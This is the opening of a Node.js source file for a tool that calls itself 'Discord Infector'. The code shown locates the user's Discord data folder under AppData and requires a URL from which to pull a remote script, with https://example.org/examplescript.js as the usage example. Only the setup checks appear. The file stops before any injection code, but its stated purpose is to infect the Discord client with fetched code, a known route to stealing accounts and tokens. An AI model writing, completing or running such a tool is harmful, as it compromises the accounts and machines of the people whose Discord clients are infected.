const fs = require('fs');
const discordPath = process.env.AppData + '/Discord';

if(process.argv.length < 3){
	console.error(`Discord Infector must be run with a URL to pull a script from.`);
	console.error(`Example: .\\discordinfector.exe https://example.org/examplescript.js`);
	process.exit();
}

if(!fs.existsSync(discordPath)){
	console.error(`Cannot find discord data in ${discordPath}!`);
	process.exit();
}
